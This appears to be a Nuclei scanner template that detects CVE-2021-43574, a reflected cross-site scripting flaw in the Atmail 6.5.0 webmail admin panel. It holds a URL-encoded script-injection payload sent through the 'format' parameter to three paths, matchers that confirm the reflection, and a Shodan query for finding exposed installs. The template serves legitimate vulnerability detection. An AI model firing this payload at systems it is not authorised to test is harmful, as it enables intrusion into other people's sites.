id: CVE-2021-43574

info:
  name: Atmail 6.5.0 - Cross-Site Scripting
  author: arafatansari,ritikchaddha
  severity: high
  description: |
    Atmail 6.5.0 contains a cross-site scripting vulnerability in WebAdmin Control Pane via the format parameter to the default URI, which allows remote attackers to inject arbitrary web script or HTML via the “format” parameter.
  reference:
    - https://medium.com/@bhattronit96/cve-2021-43574-696041dcab9e
    - https://help.atmail.com/hc/en-us/sections/115003283988
    - https://nvd.nist.gov/vuln/detail/CVE-2021-43574
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
    cve-id: CVE-2021-43574
  metadata:
    shodan-query: http.html:"Powered by Atmail"
    verified: "true"
  tags: cve,cve2021,atmail,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
      - "{{BaseURL}}/atmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
      - "{{BaseURL}}/atmail/webmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>" does not exist'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 500
          - 403
        condition: or

# Enhanced by md on 2022/09/08
